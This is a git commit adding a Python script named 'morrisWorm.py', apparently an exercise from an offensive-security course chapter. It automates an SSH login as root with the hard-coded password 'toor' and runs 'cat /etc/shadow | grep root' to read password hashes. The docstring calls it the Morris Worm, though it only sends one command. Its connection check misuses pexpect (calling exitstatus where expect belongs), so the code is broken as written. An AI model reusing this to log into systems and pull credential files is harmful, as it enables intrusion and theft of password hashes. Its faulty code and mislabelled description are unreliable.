069e391d81b1303d3b8544df9c855c19e4c59a7c
aleksa <zabumaphu@gmail.com>
2023-06-20 23:03:49 -0400

    Finished sending commands with Python through ssh.

---
+++ ch2/morrisWorm.py
@@ -0,0 +1,42 @@
+"""
+Author: Aleksa Zatezalo
+Date: June 20th, 2023
+Description: The Morris Worm coded in python.
+"""
+
+import pexpect
+PROMPT = ['# ', '>>> ', '> ', '\$']
+
+def send_command(child, cmd):
+    child.sendline(cmd)
+    child.expect(PROMPT)
+    print(child.before)
+
+def connect(user, host, password):
+    ssh_newkey = 'Are you sure you want to continue connecting'
+    connStr = 'ssh ' + user + '@' + host
+    child = pexpect.spawn(connStr)
+    ret = child.exitstatus([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
+
+    if ret == 0:
+        print('[-] Error Connecting')
+        return
+    if ret == 1:
+        child.sendline('yes')
+    ret =  child.expect('[P|p]assword:')
+    if ret == 0:
+        print('[-] Error Connecting')
+        return
+    child.sendline(password)
+    child.expect(PROMPT)
+    return child
+
+def main():
+    host = 'localhost'
+    user = 'root'
+    password = 'toor'
+    child = connect(user, host, password)
+    send_command(child, 'cat /etc/shadow | grep root')
+
+if __name__ == '__main__':
+    main()
